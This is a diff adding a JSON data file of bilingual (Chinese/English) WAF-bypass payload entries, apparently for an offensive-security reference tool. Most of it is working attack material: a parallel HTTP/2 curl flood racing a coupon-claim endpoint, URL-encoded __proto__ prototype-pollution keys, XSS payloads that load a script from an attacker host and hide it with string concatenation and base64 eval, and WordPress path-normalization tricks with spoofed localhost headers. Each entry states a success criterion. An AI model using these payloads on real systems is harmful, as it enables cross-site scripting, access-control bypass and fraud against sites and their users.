@@ -1,0 +1,238 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "biz-race-condition",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "urls=$(for i in $(seq 1 50); do echo \"https://{TARGET}/api/coupon/claim\"; done)\ncurl --http2 --parallel --parallel-immediate --parallel-max 20 -sS -o /dev/null -w \"%{http_code}\\n\" -b \"session={SESSION}\" -X POST $urls",
+          "command": "urls=$(for i in $(seq 1 50); do echo \"https://{TARGET}/api/coupon/claim\"; done)\ncurl --http2 --parallel --parallel-immediate --parallel-max 20 -sS -o /dev/null -w \"%{http_code}\\n\" -b \"session={USER_SESSION}\" -X POST $urls",
+          "title": {
+            "zh": "HTTP/2 并行领取优惠券请求",
+            "en": "HTTP/2 parallel coupon-claim flood"
+          },
+          "description": {
+            "zh": "先把 50 个目标 URL 装入 urls 变量，再用单条 curl 以 --http2 --parallel 在 HTTP/2 连接上并发提交全部领取请求，检验服务端扣减与发放逻辑的原子性。成功判据：并发窗口内出现超发（领取成功数大于库存扣减）。",
+            "en": "Builds the 50-URL list first, then fires every claim request concurrently from a single curl invocation using HTTP/2 multiplexing with --parallel, probing the atomicity of the deduction and issuance logic. Success: more successful claims than the stock decrement within the concurrency window."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "urls=$(for i in $(seq 1 50); do echo ...; done)",
+              "explanation": {
+                "zh": "构造 50 条相同目标 URL 的列表",
+                "en": "builds the list of 50 identical target URLs"
+              },
+              "type": "value"
+            },
+            {
+              "part": "--http2 --parallel --parallel-immediate --parallel-max 20",
+              "explanation": {
+                "zh": "强制 HTTP/2 并启用并行模式，立即并发、上限 20 路",
+                "en": "forces HTTP/2, enables parallel transfers with immediate dispatch capped at 20"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-b \"session={SESSION}\"",
+              "explanation": {
+                "zh": "携带同一会话 Cookie 提交，模拟同一用户并发领取",
+                "en": "replays the same session cookie to simulate one user racing the claim"
+              },
+              "type": "parameter"
+            },
+            {
+              "part": "-w \"%{http_code}\\n\"",
+              "explanation": {
+                "zh": "逐请求输出状态码，便于统计超发",
+                "en": "prints each response status code for counting over-issuance"
+              },
+              "type": "parameter"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-url",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?%255F%255Fproto%255F%255F[evilProperty]=evilPayload\n?%255F%255Fproto%255F%255F[isAdmin]=true",
+          "command": "?%5F%5Fproto%5F%5F[evilProperty]=evilPayload\n?%5F%5Fproto%5F%5F[isAdmin]=true",
+          "title": {
+            "zh": "单次编码键名",
+            "en": "Single-Encoded Key Names"
+          },
+          "description": {
+            "zh": "qs 只做一次 URL 解码：%5F%5Fproto%5F%5F 解析一轮即还原为 __proto__，可直接绕过对字面 __proto__ 键名的黑名单。原双重编码形态 %255F 仅在网关二次解码架构下成立，若目标存在双重解码可升级为该形复测。成功判据：解析后触达原型。",
+            "en": "qs decodes the query exactly once, so %5F%5Fproto%5F%5F becomes __proto__ after a single pass and slips straight past blacklists matching the literal key. The old double-encoded form only fires on gateways that decode twice. Success: the parsed key reaches the prototype."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%5F%5Fproto%5F%5F",
+              "explanation": {
+                "zh": "单次解码即还原 __proto__，绕过字面键名匹配",
+                "en": "one decode pass restores __proto__, dodging literal key matching"
+              },
+              "type": "value"
+            },
+            {
+              "part": "[evilProperty]",
+              "explanation": {
+                "zh": "qs 深解析的方括号子键语法",
+                "en": "bracket sub-key syntax consumed by qs deep parsing"
+              },
+              "type": "value"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-cache-control",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "Cache-Control: no%2Dcache\nCache-Control: no-cache=1\nCache-Control: \"no-cache\"",
+          "title": {
+            "zh": "指令编码变形",
+            "en": "Directive Encoding Mutation"
+          },
+          "description": {
+            "zh": "HTTP 头值不做百分号解码：no%2Dcache 在任何标准缓存/应用层都是字面非法指令，不会被解释为 no-cache。仅当应用或中间件错误地对头值做 URL 解码（自研解码层）时指令才还原为标准语义。失效条件：任何遵循 RFC 的标准缓存与框架均不受此形影响；no-cache=1 与引号包裹两行仍按标准语义解析。评级 C。",
+            "en": "HTTP header values are never percent-decoded, so no%2Dcache stays a literal invalid directive on every standards-compliant cache or framework. It only collapses back to no-cache when an application or middleware layer erroneously URL-decodes header values, a rare misconfiguration. The no-cache=1 and quoted lines still parse with standard semantics. Fails outright wherever RFC-compliant parsing is in place."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Cache-Control: no%2Dcache",
+              "explanation": {
+                "zh": "仅自研错误解码层会还原为 no-cache，标准层为字面非法指令",
+                "en": "only a self-rolled decode layer restores no-cache; compliant stacks see a literal invalid directive"
+              },
+              "type": "value"
+            },
+            {
+              "part": "Cache-Control: no-cache=1",
+              "explanation": {
+                "zh": "带伪参数的 no-cache，按 RFC 语法仍有效",
+                "en": "no-cache with a pseudo-argument, still valid under RFC grammar"
+              },
+              "type": "value"
+            },
+            {
+              "part": "Cache-Control: \"no-cache\"",
+              "explanation": {
+                "zh": "引号包裹指令，仅宽容解析器接受",
+                "en": "quoted directive accepted by lenient parsers only"
+              },
+              "type": "value"
+            }
+          ],
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-waf-object-prototype",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<script>Object.prototype.BOOMR = 1;Object.prototype.url='//{ATTACKER_HOST}/xss.js'</script>\n<script>Object.prototype.BOOMR = 1;Object.prototype.url='//{ATTACKER_HOST}/'</script>\n<script>Object.prototype.BOOMR = 1;Object.prototype.url='/xss.js'</script>",
+          "command": "http://{TARGET}/page?#__proto__[BOOMR]=1&__proto__[url]=//{ATTACKER_HOST}/xss.js\n<script>var P='Object.prot'+'otype';(0,eval)(P+'.BOOMR=1;'+P+\".url='//{ATTACKER_HOST}/xss.js'\")</script>\n<script>eval(atob('T2JqZWN0LnByb3RvdHlwZS5CT09NUj0x'))</script>",
+          "title": {
+            "zh": "查询参数载体与分段还原变体",
+            "en": "Query-param gadget and segmented-restore variants"
+          },
+          "description": {
+            "zh": "原命令与 execution 逐字相同、对过滤环境无新变形。本变体改用 URL 查询/哈希参数作污染载体（qs 类深解析直接触达原型），并以字符串拼接与 base64 分段还原绕过对 Object.prototype 字面特征的扫描。成功判据：页面向 //{ATTACKER_HOST}/xss.js 发起脚本请求。",
+            "en": "The original block repeated the execution sample verbatim and added nothing for filtered environments. These variants carry the pollution through URL query/hash parameters consumed by qs-style deep merging and rebuild Object.prototype via string concatenation or a base64 eval, dodging literal signature scans. Success: the page requests the attacker-hosted xss.js."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "__proto__[BOOMR]=1&__proto__[url]=...",
+              "explanation": {
+                "zh": "查询/哈希参数作污染源，qs 深解析直接合并进原型",
+                "en": "query/hash params feed qs-style deep merge straight into the prototype"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "'Object.prot'+'otype'",
+              "explanation": {
+                "zh": "字符串拼接分段还原，绕过 Object.prototype 字面特征",
+                "en": "concatenated segments defeat literal Object.prototype signatures"
+              },
+              "type": "control"
+            },
+            {
+              "part": "eval(atob('T2Jq...'))",
+              "explanation": {
+                "zh": "base64 还原再求值，规避明文特征扫描",
+                "en": "base64-decoded eval evades plaintext signature scans"
+              },
+              "type": "control"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-trusted-header-and-wordpress-route-bypass",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "X-Remote-Addr: 127.0.0.1\nauthor=1\nhttp://{TARGET}/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils\nhttp://{TARGET}/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar\nhttp://{TARGET}/index.php/wp-json/wp/v2/users/",
+          "command": "http://{TARGET}//wp-admin/./load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils\nhttp://{TARGET}/wp-admin/load-scripts.php;.css?load%5B%5D=jquery-core\nhttp://{TARGET}/index.php/../wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-core\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nClient-IP: 127.0.0.1",
+          "title": {
+            "zh": "路径规范化与替代可信头变形",
+            "en": "Path-normalization and alternate trusted-header variants"
+          },
+          "description": {
+            "zh": "原命令与 execution 逐字相同、无边界变形。本变体改用双斜杠加点段、分号截断与路径回溯三种规范化差分载体，并把可信头族扩展到 X-Real-IP、X-Originating-IP 与 Client-IP。成功判据：load-scripts.php 在未认证下返回 200 且输出脚本内容。",
+            "en": "The original block repeated the execution sample verbatim with no boundary mutation. These variants exercise double-slash plus dot-segment, semicolon truncation, and path-traversal normalization differentials, and extend the trusted-IP family to X-Real-IP, X-Originating-IP, and Client-IP. Success: load-scripts.php returns 200 unauthenticated and emits script content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "//wp-admin/./load-scripts.php",
+              "explanation": {
+                "zh": "双斜杠与点段命中规范化差分",
+                "en": "double slash plus dot segment hits normalization differentials"
+              },
+              "type": "value"
+            },
+            {
+              "part": "load-scripts.php;.css",
+              "explanation": {
+                "zh": "分号路径参数截断后缀检测",
+                "en": "semicolon path parameter truncates extension checks"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/index.php/../wp-admin/...",
+              "explanation": {
+                "zh": "路径回溯绕过前缀匹配",
+                "en": "traversal escapes prefix-based matching"
+              },
+              "type": "value"
+            },
+            {
+              "part": "X-Real-IP / X-Originating-IP / Client-IP",
+              "explanation": {
+                "zh": "替代可信 IP 头族扩展",
+                "en": "alternate trusted-IP header family"
+              },
+              "type": "header"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
